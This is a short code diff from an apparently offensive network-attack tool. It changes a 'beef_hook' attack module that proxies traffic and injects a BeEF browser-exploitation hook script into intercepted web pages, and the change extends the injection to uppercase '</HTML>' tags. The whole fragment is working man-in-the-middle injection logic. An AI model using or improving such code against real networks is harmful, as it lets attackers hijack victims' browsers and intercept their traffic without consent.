@@ -59,6 +59,7 @@ class beef_hook(Attack):
         self.proxy_server = proxy.ProxyServer(config, 5544)
         self.hooker = Hooker(self.proxy_server, self.hook_script)
 
+        util.Msg('Firing up BeEF hook...')
         thread = Thread(target=self.hooker.run)
         thread.start()
 
@@ -97,4 +98,5 @@ class Hooker(controller.Master):
             should have this.
         """
         msg.replace("</html>", "{0}</html>".format(self.script_hook))
+        msg.replace("</HTML>", "{0}</HTML>".format(self.script_hook))
         msg.reply()
